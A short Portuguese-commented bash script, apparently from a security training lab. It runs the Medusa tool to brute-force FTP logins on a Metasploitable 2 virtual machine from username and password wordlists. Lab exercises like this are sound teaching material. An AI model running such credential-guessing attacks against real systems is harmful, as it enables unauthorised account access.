#!/bin/bash
# ==============================================================================
# Script de Auditoria Educacional - Força Bruta em FTP com Medusa
# Ambiente: Laboratório VirtualBox (Kali Linux -> Metasploitable 2)
# ==============================================================================

TARGET_IP="192.168.56.102" # Ajuste para o IP da sua máquina Metasploitable 2
USER_LIST="../wordlists/users_common.txt"
PASS_LIST="../wordlists/passwords_common.txt"

echo "=========================================================="
echo "[+] Iniciando Auditoria de Autenticação FTP via Medusa..."
echo "[+] Alvo: $TARGET_IP"
echo "[+] Lista de Usuários: $USER_LIST"
echo "[+] Lista de Senhas: $PASS_LIST"
echo "=========================================================="

# Executa o Medusa:
# -h: Alvo
# -U: Arquivo com lista de usuários
# -P: Arquivo com lista de senhas
# -M: Módulo do serviço (ftp)
# -f: Para na primeira combinação válida encontrada para cada usuário (fast exit)
# -v 4: Nível de verbosidade para acompanhar tentativas
medusa -h "$TARGET_IP" -U "$USER_LIST" -P "$PASS_LIST" -M ftp -f -v 4

echo "=========================================================="
echo "[+] Auditoria FTP Concluída!"
echo "=========================================================="
